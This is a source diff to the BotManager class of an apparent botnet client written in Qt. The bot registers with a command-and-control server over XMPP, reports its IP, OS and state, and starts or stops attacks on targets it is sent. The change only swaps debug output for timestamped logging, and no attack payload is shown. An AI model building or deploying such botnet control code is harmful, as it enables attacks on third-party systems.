@@ -16,7 +16,8 @@
 #include <QUrl>
 #include <QNetworkInterface>
 #include <QSysInfo>
-#include <QDebug>
+#include <QTime>
+#include <iostream>
 
 BotManager *BotManager::instance()
 {
@@ -38,14 +39,14 @@ void BotManager::disconnectFromCC()
 {
     _xmppClient -> disconnectFromServer();
 
-    qDebug() << "Desconectado de C&C";
+    writeEvent("Desconectado de C&C");
 }
 
 void BotManager::readyOnXmppClient()
 {
     _bot -> setState(WaitingForCommand);
 
-    qDebug() << "Conectado a C&C como" << _xmppClient -> whoAmI();
+    writeEvent(QString("Conectado a C&C como %1").arg(_xmppClient -> whoAmI()));
 }
 
 void BotManager::commandReceivedOnBot(Message *command)
@@ -58,35 +59,42 @@ void BotManager::commandReceivedOnBot(Message *command)
         response = new BotStateResponse;
         dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);
 
-        qDebug() << "Recibido GET_BOT_STATE_CMD de" << command -> from();
-        qDebug() << "Enviado BOT_STATE_RES con id:" << _bot -> id()
-                 << "ip:" << _bot -> ip() << "os:" << _bot -> os()
-                 << "estado:" << _bot -> state()
-                 << "attackId:" << _bot -> attack().id()
-                 << "target:" << _bot -> attack().target();
+        writeEvent(QString("Recibido GET_BOT_STATE_CMD [1:1] de %1").arg(command -> from()));
+        writeEvent(QString("Enviado BOT_STATE_RES [1:1] con (id: %1 ip: %2 os: %3 estado: %4 attackId: %5 target: %6) a %7")
+                   .arg(_bot -> id())
+                   .arg(_bot -> ip())
+                   .arg(_bot -> os())
+                   .arg(_bot -> state())
+                   .arg(_bot -> attack().id())
+                   .arg(!_bot -> attack().target().isEmpty() ? _bot -> attack().target() : "-")
+                   .arg(command -> from()));
     } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
         response = new AttackStartedResponse(startAttackCommand -> id());
 
-        qDebug() << "Recibido START_ATTACK_CMD de" << startAttackCommand -> from()
-                 << "con id:" << startAttackCommand -> id()
-                 << "target:" << startAttackCommand -> target();
+        writeEvent(QString("Recibido START_ATTACK_CMD [1:N] de %1 con (id: %2 target: %3)")
+                   .arg(startAttackCommand -> from())
+                   .arg(startAttackCommand -> id())
+                   .arg(startAttackCommand -> target()));
 
         _bot -> setState(AttackInProgress);
         _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));
 
-        qDebug() << "Iniciando ataque id:" << _bot -> attack().id() << "target:" << _bot -> attack().target();
-
-        qDebug() << "Enviado ATTACK_STARTED_RES";
+        writeEvent(QString("Iniciando ataque (id: %1 target: %2)")
+                   .arg(_bot -> attack().id())
+                   .arg(_bot -> attack().target()));
+        writeEvent(QString("Enviado ATTACK_STARTED_RES [1:1] a %1").arg(command -> from()));
     } else if(dynamic_cast<StopAttackCommand *>(command)) {
         response = new AttackStoppedResponse(command -> id());
 
-        qDebug() << "Recibido STOP_ATTACK_CMD de" << command -> from();
-        qDebug() << "Parando ataque id:" << _bot -> attack().id() << "target:" << _bot -> attack().target();
+        writeEvent(QString("Recibido STOP_ATTACK_CMD [1:N] de %1").arg(command -> from()));
+        writeEvent(QString("Parando ataque (id: %1 target: %2)")
+                   .arg(_bot -> attack().id())
+                   .arg(_bot -> attack().target()));
 
         _bot -> setState(WaitingForCommand);
         _bot -> setAttack(Attack());
 
-        qDebug() << "Enviado ATTACK_STOPPED_RES";
+        writeEvent(QString("Enviado ATTACK_STOPPED_RES [1:1] a %1").arg(command -> from()));
     } else
         isValid = false;
 
@@ -177,4 +185,9 @@ void BotManager::setupBot(const QString& pubIp)
 void BotManager::sendHttpGetRequestToDiscoverIp()
 {
     _networkAccessManager -> get(QNetworkRequest(QUrl(IP_ADDRESS_API)));
+}
+
+void BotManager::writeEvent(const QString& event)
+{
+    std::cout << QString("[%1] %2").arg(QTime::currentTime().toString()).arg(event).toStdString() << std::endl;
 }
